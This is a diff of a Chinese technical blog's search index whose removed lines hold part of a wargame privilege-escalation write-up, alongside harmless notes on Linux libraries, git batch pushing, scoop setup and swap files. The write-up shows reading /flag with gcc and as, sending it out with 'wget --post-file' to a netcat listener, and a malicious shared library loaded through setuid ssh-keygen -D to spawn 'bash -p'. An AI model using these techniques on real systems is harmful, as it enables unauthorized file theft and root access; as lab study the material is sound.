class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-
-<p>这条命令告诉<code>gcc</code>命令执行预处理操作，以处理<code>/flag</code>文件中的C语言代码，<code>-E</code> 表示执行预处理操作而不进行编译，<code>-x c</code>用于指定输入文件的类型，表示输入文件是C语言代码。</p>
-<h3 id="49"><a href="#49" class="headerlink" title="49"></a>49</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">as -a /flag</span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="50"><a href="#50" class="headerlink" title="50"></a>50</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lp 8088 &amp; wget --post-file=/flag http://127.0.0.1:8088</span><br></pre></td></tr></table></figure></div>
-
-<p>查看wget命令后使用了-i参数读取，读取出来了但是都是小写，没有通过，后经查阅发现需要这样使用</p>
-<h3 id="51"><a href="#51" class="headerlink" title="51"></a>51</h3><p><a class="link"   href="https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s" >related resource <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.bilibili.com/video/BV1ok4y1m75p/" >b站提取video <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;euid:%d\n&quot;</span>,geteuid());</span><br><span class="line">    sendfile(<span class="number">1</span>,open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>),<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">    <span class="comment">//system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);</span></span><br><span class="line">    <span class="type">char</span> *argvv[]=&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-p&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execvp(<span class="string">&quot;/bin/bash&quot;</span>,argvv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>best answer</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sendfile(<span class="number">1</span>,open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>),<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc level51.c -shared -o su.os</span><br><span class="line">ssh-keygen -D ./su.os</span><br></pre></td></tr></table></figure></div>
-
-<p>首先翻阅man page可以看到ssh-keygen用-D参数可以直接运行任意的共享库，如果有suid的话就能运行我们的恶意代码造成提权</p>
-<p>c程序中可以利用&lt;dlfcn.h&gt;头文件中的一系列函数dlopen，dlclose来加载运行共享库。</p>
-<p>gcc可以通过<code>-shared</code>参数来创建共享库，共享库不能单独运行，它相当于一个必须被别人调用才能运行的程序，它与普通二进制程序的区别可以通过file命令来查看，共享库没有<code>interpreter</code>这样的字段，也就是没有链接解释器。%</p>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>linux lib</title>
-    <url>/2024/05/12/linux-lib/</url>
-    <content><![CDATA[<h1 id="查找库文件"><a href="#查找库文件" class="headerlink" title="查找库文件"></a>查找库文件</h1><p><strong>locate</strong>：<br>首先要确保<code>locate</code>数据库是最新的：</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure></div>
-<p>然后查找库文件：</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">locate libpthread.so</span><br></pre></td></tr></table></figure></div>
-
-<p><br><br></p>
-<h1 id="确认库文件的存在"><a href="#确认库文件的存在" class="headerlink" title="确认库文件的存在"></a>确认库文件的存在</h1><p><strong>ldconfig -p</strong>：这个命令显示链接器的库缓存中所有已知的库，它可以检查特定的库是否已在系统的链接器配置中</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ldconfig -p | grep libpthread</span><br></pre></td></tr></table></figure></div>
-
-<p><br><br></p>
-<h1 id="安装库文件"><a href="#安装库文件" class="headerlink" title="安装库文件"></a>安装库文件</h1><p>使用系统对应的包管理器安装</p>
-<p><br><br></p>
-<h1 id="查看库文件的基本信息"><a href="#查看库文件的基本信息" class="headerlink" title="查看库文件的基本信息"></a>查看库文件的基本信息</h1><p><strong>dpkg -L</strong>：用于列出指定软件包中的所有文件，包括库文件。例如：</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg -L libc6-dev</span><br></pre></td></tr></table></figure></div>
-
-<p><br><br></p>
-<h1 id="确定库文件的链接路径"><a href="#确定库文件的链接路径" class="headerlink" title="确定库文件的链接路径"></a>确定库文件的链接路径</h1><p>**&#x2F;etc&#x2F;ld.so.conf 和 &#x2F;etc&#x2F;ld.so.conf.d&#x2F;**：这些配置文件和目录定义了链接器搜索动态库的路径。可以查看和修改这些文件以包含或确认包含必要的库文件路径。</p>
-<p><br><br></p>
-<h1 id="更新链接器的配置"><a href="#更新链接器的配置" class="headerlink" title="更新链接器的配置"></a>更新链接器的配置</h1><p><strong>ldconfig</strong>：当更改了 <code>ld.so.conf</code> 或在库目录中添加了新的库文件后，运行此命令更新链接器的缓存。</p>
-]]></content>
-      <tags>
-        <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>clash keyword</title>
-    <url>/2023/10/02/clash-keyword/</url>
-    <content><![CDATA[<ul>
-<li>DOMAIN-SUFFIX：域名后缀匹配</li>
-<li>DOMAIN：域名匹配</li>
-<li>DOMAIN-KEYWORD：域名关键字匹配</li>
-<li>IP-CIDR：IP 段匹配</li>
-<li>SRC-IP-CIDR：源 IP 段匹配</li>
-<li>GEOIP：GEOIP 数据库（国家代码）匹配</li>
-<li>DST-PORT：目标端口匹配</li>
-<li>SRC-PORT：源端口匹配</li>
-<li>PROCESS-NAME：源进程名匹配</li>
-<li>RULE-SET：Rule Provider 规则匹配</li>
-<li>MATCH：全匹配</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git error</title>
-    <url>/2024/07/16/error/</url>
-    <content><![CDATA[<h4 id="记录一次git-push大仓库的问题，背景是一个在本地的仓库推送到一个新仓库中-包括所有的历史提交记录"><a href="#记录一次git-push大仓库的问题，背景是一个在本地的仓库推送到一个新仓库中-包括所有的历史提交记录" class="headerlink" title="记录一次git push大仓库的问题，背景是一个在本地的仓库推送到一个新仓库中(包括所有的历史提交记录)"></a>记录一次git push大仓库的问题，背景是一个在本地的仓库推送到一个新仓库中(包括所有的历史提交记录)</h4><h2 id="git-error-failed-to-push-some-refs-to-remote"><a href="#git-error-failed-to-push-some-refs-to-remote" class="headerlink" title="git error: failed to push some refs to remote"></a>git error: failed to push some refs to remote</h2><p>这个问题是本地和远程会产生冲突，因为远程是新仓库，和本地仓库并没有联系，所以这里可以直接<code>git pull &lt;repository&gt; &lt;branch&gt; --allow-unrelated-histories</code>。</p>
-<h2 id="error-RPC-failed-HTTP-500-curl-22-The-requested-URL-returned-error-500"><a href="#error-RPC-failed-HTTP-500-curl-22-The-requested-URL-returned-error-500" class="headerlink" title="error: RPC failed; HTTP 500 curl 22 The requested URL returned error: 500"></a>error: RPC failed; HTTP 500 curl 22 The requested URL returned error: 500</h2><p>这个错误大家可能认为是网络的问题，但是我在推送的时候发现每次都是在2.43GB的时候git就会退出报出这个错误，后面查阅之后发现是Github对单次push的大小有限制，最大为2GB，具体的情况可以看<a class="link"   href="https://docs.github.com/en/get-started/using-git/troubleshooting-the-2-gb-push-limit" >Troubleshoting the 2GB push limit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,这里我写了一个bash脚本，它能够自动一点点推送你的仓库，如下：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set remote repository and branch</span></span><br><span class="line">remote=<span class="string">&quot;rustlinux&quot;</span></span><br><span class="line">branch=<span class="string">&quot;rust&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set the number of commits to push per batch</span></span><br><span class="line">batch_size=5000</span><br><span class="line"></span><br><span class="line"><span class="comment"># the hash value provided by the user is pushed</span></span><br><span class="line"><span class="comment"># start_commit_hash=$1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if [ -z &quot;$start_commit_hash&quot; ]; then</span></span><br><span class="line">    <span class="comment"># echo &quot;No start commit hash provided. Exiting...&quot;</span></span><br><span class="line">    <span class="comment"># exit 1</span></span><br><span class="line"><span class="comment"># fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get hashed of all commits(oldest to newest)</span></span><br><span class="line">commit_hashes=$(git rev-list --reverse HEAD)</span><br><span class="line"><span class="comment"># commit_hashes=$(git rev-list --reverse $start_commit_hash..HEAD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read the hash value into an array</span></span><br><span class="line">commit_array=(<span class="variable">$commit_hashes</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calculate the total number of submissions</span></span><br><span class="line">total_commits=<span class="variable">$&#123;#commit_array[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># push in batches</span></span><br><span class="line"><span class="keyword">for</span> (( i=<span class="number">0</span>; i&lt;total_commits; i+=batch_size ))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    end_index=$((i + batch_size - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if it exceeds the array range</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$end_index</span> -ge <span class="variable">$total_commits</span> ]; <span class="keyword">then</span></span><br><span class="line">        end_index=$((total_commits - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the hash value of the last submission of the current batch</span></span><br><span class="line">    end_commit_hash=<span class="variable">$&#123;commit_array[$end_index]&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Pushing from commit <span class="variable">$i</span> to <span class="variable">$end_index</span>: <span class="variable">$end_commit_hash</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># push the current batch</span></span><br><span class="line">    git push <span class="variable">$remote</span> <span class="variable">$end_commit_hash</span>:<span class="variable">$branch</span> --force</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if the push is successful</span></span><br><span class="line">    <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Error pushing to <span class="variable">$remote</span>. Stopping the script.&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Successfully pushed to <span class="variable">$remote</span> up to commit <span class="variable">$end_commit_hash</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;All commits have been successfully pushed.&quot;</span></span><br></pre></td></tr></table></figure></div>
-<p>这里额外提供了一个在运行脚本时候接收参数的功能，可以让你手动停下脚本后还可以继续从上次没有推送的hash值继续开始推送(这里要给的是上次推送时最后一次成功的hash值，而不是手动停止的那一次)</p>
-<h2 id="git功能"><a href="#git功能" class="headerlink" title="git功能"></a>git功能</h2><p><code>git gc</code>：用于优化仓库的性能和减少磁盘使用空间。</p>
-<p><code>git fsck</code>：用于验证Git仓库中所有对象的完整性和连接性，一般在<code>git gc</code>后使用</p>
-<p><code>git config --global http.postBuffer 157286400</code>: 这个是增加你的git buffer,这样可以推送更大文件。</p>
-]]></content>
-      <tags>
-        <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>scoop on git bash</title>
-    <url>/2024/08/27/scoop-on-git-bash/</url>
-    <content><![CDATA[<p>闲来无事又不想学习，折腾了一下Windows下的命令行什么的，发现<code>scoop</code>还是挺好用的，相较于<code>winget</code>，它更适合我这种比较喜欢linux命令行风格的，再加上<code>mingw</code>的<code>git-bash</code>，在<code>Windows-Terminal</code>下配上<code>oh-my-zsh</code>，实在是太舒服了。效果图如下：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/PixPin_2024-08-27_21-02-58.png"
-                     
-                ></p>
-<p>下面记录一下使用过程中遇到的问题</p>
-<h4 id="miniconda安装"><a href="#miniconda安装" class="headerlink" title="miniconda安装"></a>miniconda安装</h4><p>这里可以直接<code>scoop install miniconda</code>，但是安装完成后会让你<code>conda init &lt;your shell&gt;</code>，执行这一步会报错，是一个说在<code>~/.zshrc</code>中<code>^M</code>符号有问题的，这里很自然的可以想到编码方式的不同，但是改变<code>zshrc</code>的编码方式并不能解决问题，后面找到<a class="link"   href="https://github.com/conda/conda/issues/9922#issuecomment-1361695031" >https://github.com/conda/conda/issues/9922#issuecomment-1361695031 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，把这个写入<code>zshrc</code>中，然后再在这之前加入<code>export PYTHONIOENCONFIG=utf-8</code>，然后就可以解决这个问题了。配置参考如下图：<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/PixPin_2024-08-27_21-36-55.png"
-                     
-                ></p>
-<h4 id="LunarVim"><a href="#LunarVim" class="headerlink" title="LunarVim"></a>LunarVim</h4><p>直接<code>scoop install lunarvim</code>，在这之前要<code>scoop install neovim</code>一下，然后关于<code>NodeJs</code>的，建议在这之前装好<code>nvm</code>和<code>miniconda</code>，都可以使用scoop安装。对于<code>nvm</code>，在Windows下直接<code>nvm install 18</code>大概率会出错，具体可以参考<a class="link"   href="https://github.com/coreybutler/nvm-windows/issues/436" >https://github.com/coreybutler/nvm-windows/issues/436 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。所以你可以<code>nvm install latest all --insecure</code>，这里的重点在这个<code>insecure</code>。对于<code>npm</code>，可以使用<code>npm proxy http://127.0.0.1:7890</code>设置代理。</p>
-<h4 id="Cursor安装"><a href="#Cursor安装" class="headerlink" title="Cursor安装"></a>Cursor安装</h4><p><code>openai</code>推出的一个编辑器，优点在于可以使用AI辅助coding，还可以同步VsCode的所有设置和插件，非常不错，这个的安装要自己去官网下载安装包安装，然后安装的适合可以选择是否安装到命令行，对于<code>git-bash</code>下，直接<code>cursor</code>会出错，需要<code>cd $(dirname $(which cursor))</code>，然后参考<a class="link"   href="https://github.com/getcursor/cursor/issues/1121" >https://github.com/getcursor/cursor/issues/1121 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>修改<code>cursor</code>这个脚本就可以了。</p>
-<h4 id="zsh-history"><a href="#zsh-history" class="headerlink" title="zsh history"></a>zsh history</h4><p>在Windows下，我的<code>zsh</code>会将<code>history</code>全部存储在<code>/c/Users/$(Username)</code>下，然后它还不会把<code>history</code>全部存储在一个<code>.zsh_history</code>文件中，你可以使用以下命令定期对这些文件进行整理。</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.zsh_history.* &gt;&gt; ~/.zsh_history</span><br><span class="line"><span class="built_in">rm</span> ~/.zsh_history.*</span><br></pre></td></tr></table></figure></div>
-
-
-<h4 id="cargo"><a href="#cargo" class="headerlink" title="cargo"></a>cargo</h4><p>直接<code>scoop install rustup</code>会在使用的时候报一个<code>link.exe</code>什么的错误，你可以这样：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">scoop install rustup-gnu</span><br><span class="line">rustup toolchain install stable-x86_64-pc-windows-gnu</span><br><span class="line">rustup default stable-x86_64-pc-windows-gnu</span><br></pre></td></tr></table></figure></div>
-<p>具体可以参考<a class="link"   href="https://stackoverflow.com/questions/73421853/how-to-install-rust-via-cli-on-windows" >https://stackoverflow.com/questions/73421853/how-to-install-rust-via-cli-on-windows <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
+    <title>swap</title>
+    <url>/2024/05/23/swap/</url>
+    <content><![CDATA[<h3 id="检查是否已有交换文件"><a href="#检查是否已有交换文件" class="headerlink" title="检查是否已有交换文件"></a>检查是否已有交换文件</h3><p>首先，检查是否已有交换文件正在使用：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapon --show</span><br></pre></td></tr></table></figure></div>
+
+
+<p>如果已有交换文件 <code>/swapfile</code>，你可以禁用它，删除旧的交换文件，然后再创建新的交换文件。</p>
+<h3 id="禁用并删除旧的交换文件"><a href="#禁用并删除旧的交换文件" class="headerlink" title="禁用并删除旧的交换文件"></a>禁用并删除旧的交换文件</h3><ol>
+<li><p><strong>禁用当前交换文件</strong>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapoff /swapfile</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>删除旧的交换文件</strong>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> /swapfile</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<h3 id="创建新的交换文件"><a href="#创建新的交换文件" class="headerlink" title="创建新的交换文件"></a>创建新的交换文件</h3><ol>
+<li><p><strong>创建新的交换文件</strong>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo fallocate -l 4G /swapfile</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>设置交换文件的权限</strong>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> 600 /swapfile</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>将文件设置为交换空间</strong>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkswap /swapfile</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>启用交换文件</strong>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapon /swapfile</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>验证交换空间是否已启用</strong>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapon --show</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>为了让交换文件在重启后仍然有效</strong>，将其添加到 <code>/etc/fstab</code>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/swapfile none swap sw 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a /etc/fstab</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h3><p>使用 <code>sudo swapon --show</code> 验证交换空间是否正确启用：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapon --show</span><br></pre></td></tr></table></figure></div>]]></content>
       <tags>
         <tag>tools</tag>
       </tags>
@@ -1323,46 +1372,6 @@
 <p>在Linux系统中，你可以使用<code>sntp time.pool.aliyun.com</code>进行时间同步</p>
 <p>这里挂一些其他的时间协议:<br><a class="link"   href="https://en.wikipedia.org/wiki/Precision_Time_Protocol" >精确时间协议PTP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.ibm.com/docs/zh/i/7.5?topic=services-simple-network-time-protocol" >简单网络时间协议SNTP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://en.wikipedia.org/wiki/Time-Triggered_Protocol" >时间触发协议TTP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>swap</title>
-    <url>/2024/05/23/swap/</url>
-    <content><![CDATA[<h3 id="检查是否已有交换文件"><a href="#检查是否已有交换文件" class="headerlink" title="检查是否已有交换文件"></a>检查是否已有交换文件</h3><p>首先，检查是否已有交换文件正在使用：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapon --show</span><br></pre></td></tr></table></figure></div>
-
-
-<p>如果已有交换文件 <code>/swapfile</code>，你可以禁用它，删除旧的交换文件，然后再创建新的交换文件。</p>
-<h3 id="禁用并删除旧的交换文件"><a href="#禁用并删除旧的交换文件" class="headerlink" title="禁用并删除旧的交换文件"></a>禁用并删除旧的交换文件</h3><ol>
-<li><p><strong>禁用当前交换文件</strong>：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapoff /swapfile</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><strong>删除旧的交换文件</strong>：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> /swapfile</span><br></pre></td></tr></table></figure></div></li>
-</ol>
-<h3 id="创建新的交换文件"><a href="#创建新的交换文件" class="headerlink" title="创建新的交换文件"></a>创建新的交换文件</h3><ol>
-<li><p><strong>创建新的交换文件</strong>：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo fallocate -l 4G /swapfile</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><strong>设置交换文件的权限</strong>：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> 600 /swapfile</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><strong>将文件设置为交换空间</strong>：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkswap /swapfile</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><strong>启用交换文件</strong>：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapon /swapfile</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><strong>验证交换空间是否已启用</strong>：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapon --show</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p><strong>为了让交换文件在重启后仍然有效</strong>，将其添加到 <code>/etc/fstab</code>：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/swapfile none swap sw 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a /etc/fstab</span><br></pre></td></tr></table></figure></div></li>
-</ol>
-<h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h3><p>使用 <code>sudo swapon --show</code> 验证交换空间是否正确启用：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo swapon --show</span><br></pre></td></tr></table></figure></div>]]></content>
-      <tags>
-        <tag>tools</tag>
-      </tags>
   </entry>
   <entry>
     <title>tmux</title>
